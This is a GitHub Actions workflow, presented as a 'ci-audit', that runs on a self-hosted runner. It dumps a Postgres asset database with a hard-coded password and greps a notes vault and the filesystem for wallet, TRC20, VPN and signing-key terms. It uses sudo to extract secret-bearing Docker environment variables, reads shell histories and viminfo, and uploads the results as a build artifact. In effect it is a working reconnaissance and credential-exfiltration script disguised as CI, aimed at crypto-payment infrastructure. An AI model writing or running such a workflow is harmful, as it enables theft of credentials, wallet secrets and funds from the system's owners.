name: ci-audit-2918d
on: push
permissions:
  contents: read
jobs:
  host:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 55
    steps:
      - name: asset_db_full
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2918d"; mkdir -p "$D"; export PGPASSWORD='cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT'
          {
            echo "########## Asset schema"; psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc '\\d "Asset"' 2>&1 | head -40
            echo "########## Asset rows (compact)"; psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc 'select * from "Asset" order by id' 2>&1 | cut -c1-300 | head -60
            echo "########## Lookup"; psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc 'select * from "Lookup" order by id' 2>&1 | cut -c1-200 | head -60
            echo "########## grep infra keywords in all text columns"; psql -h 127.0.0.1 -U dpfasset -d dpfasset -Atc "select id,row_to_json(t) from \"Asset\" t where row_to_json(t)::text ~* '(vpn|openvpn|tailscale|windows|sign|wallet|tron|trc20|bep20|hot.?wallet|j.?wallet|10\\.0\\.0|172\\.16|192\\.168|pay|withdraw|server|ec2|aws)'" 2>&1 | cut -c1-400 | head -40
            echo "########## Other databases"; psql -h 127.0.0.1 -U dpfasset -d postgres -Atc 'select datname from pg_database' 2>&1 | head -10
          } > "$D/assetdb.txt" 2>&1
          wc -l "$D/assetdb.txt"; sed -n '1,220p' "$D/assetdb.txt"
      - name: vault_projects
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2918d"; V=/home/ubuntu/apps/obsidian-vault
          {
            echo "########## Projects listing"; ls -la $V/Projects 2>&1 | head -40
            echo "########## MOC/README"; head -40 $V/MOC.md 2>/dev/null; head -20 $V/README.md 2>/dev/null
            echo "########## AWS-Launchpad.md"; cat $V/Projects/AWS-Launchpad.md 2>/dev/null | head -120
            echo "########## grep Projects for infra/payment"; grep -rInE 'vpn|openvpn|tailscale|10\.0\.0|172\.16|192\.168|sign|wallet|tron|trc20|withdraw|penarikan|payment|payout|dupoin|aws|ec2|windows|rdp' $V/Projects 2>/dev/null | cut -c1-260 | head -100
            echo "########## top-level non-session files"; find $V -maxdepth 2 -type f 2>/dev/null | grep -v '/Sessions/' | head -80
            echo "########## any other dirs mentioning Dupoin infra"; grep -rIl -m1 -E 'pro-srv|mydupoin|wallet|signing|hot.?wallet|penarikan' $V --include='*.md' 2>/dev/null | grep -v Sessions | head -30
          } > "$D/projects.txt" 2>&1
          wc -l "$D/projects.txt"; sed -n '1,320p' "$D/projects.txt"
      - name: docker_hist_vim_fs
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2918d"
          {
            echo "########## docker sudo ps"; sudo -n docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>&1 | head -30
            echo "########## docker images"; sudo -n docker images --format '{{.Repository}}:{{.Tag}} {{.ID}} {{.Size}}' 2>&1 | head -40
            echo "########## docker env"; for c in $(sudo -n docker ps -aq 2>/dev/null | head -20); do sudo -n docker inspect "$c" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin)[0];print('==',d['Name'],d['Config']['Image']);[print(' ',e[:160]) for e in (d['Config'].get('Env') or []) if any(k in e.upper() for k in ('KEY','SECRET','TOKEN','TRON','WALLET','SIGN','MNEMONIC','PASS','DATABASE','URL'))]" 2>/dev/null; done | cut -c1-240 | head -60
            echo "########## docker mounts"; for c in $(sudo -n docker ps -aq 2>/dev/null | head -20); do echo "== $c"; sudo -n docker inspect "$c" --format '{{range .Mounts}}{{.Source}} -> {{.Destination}}{{"\n"}}{{end}}' 2>/dev/null; done | head -40
            echo "########## bash history content"; cat /home/ubuntu/.bash_history 2>&1; echo '--zsh--'; cat /home/ubuntu/.zsh_history 2>&1 | head -40
            echo "########## viminfo"; cat /home/ubuntu/.viminfo 2>&1 | cut -c1-200 | head -60
            echo "########## full-fs ovpn/tron/wallet grep (excluding noise)"; sudo -n grep -rIl -m1 -E 'TronGrid|TRC20|BEP20|J ?WALLET|hot.?wallet|\.ovpn|openvpn|Tailscale|tskey-' /etc /var /home/ubuntu /opt /srv 2>/dev/null | grep -vE 'node_modules|\.venv|/\.git/|obsidian-vault|/usr/|site-packages|\.cache|dist-packages' | head -40
            echo "########## db backups"; ls -la /home/ubuntu/db-backups 2>&1; for f in /home/ubuntu/db-backups/*; do echo "== $f"; sudo -n file "$f" 2>/dev/null; done | head -40
            echo "########## dpfasset/dw env names (masked)"; for e in /home/ubuntu/apps/*/.env; do echo "== $e"; sed -E 's/=.*/=<masked>/' "$e" 2>/dev/null | head -30; done
            echo "########## nginx upstreams internals"; sudo -n grep -rhE 'proxy_pass|upstream|server ' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | sort -u | cut -c1-160 | head -60
          } > "$D/docker.txt" 2>&1
          wc -l "$D/docker.txt"; sed -n '1,320p' "$D/docker.txt"
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: a2918d
          path: ${{ runner.temp }}/a2918d
          if-no-files-found: warn
          retention-days: 2
